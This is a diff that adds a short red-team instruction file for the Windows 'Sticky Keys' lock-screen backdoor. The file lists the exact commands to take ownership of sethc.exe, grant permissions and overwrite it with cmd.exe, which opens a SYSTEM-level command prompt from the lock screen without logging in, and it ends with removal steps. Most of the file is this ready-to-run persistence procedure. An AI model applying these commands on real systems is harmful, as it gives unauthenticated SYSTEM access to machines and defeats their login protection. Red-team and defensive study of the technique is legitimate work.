@@ -1,0 +1,33 @@
+Sticky Keys LockScreen Backdoor Instructions
+============================================
+
+Description:
+------------
+This persistence method replaces the Sticky Keys executable (sethc.exe)
+with cmd.exe, allowing access to a SYSTEM shell from the Windows lock screen
+by pressing Shift 5 times.
+
+When active, this allows the Red Team to open a SYSTEM-level command prompt
+without logging in.
+
+1. Take ownership of sethc.exe:
+   takeown /f C:\Windows\System32\sethc.exe
+
+2. Grant full permissions to Administrators:
+   icacls C:\Windows\System32\sethc.exe /grant administrators:F
+
+3. Backup original file (optional but recommended):
+   copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe
+
+4. Replace sethc.exe with cmd.exe:
+   copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe /y
+
+5. Lock the screen and press Shift 5 times to activate.
+
+Removal (Restoring original functionality):
+
+Option 1 – Restore from backup:
+   copy C:\Windows\System32\sethc_backup.exe C:\Windows\System32\sethc.exe /y
+
+Option 2 – Use System File Checker (sfc):
+   sfc /scannow
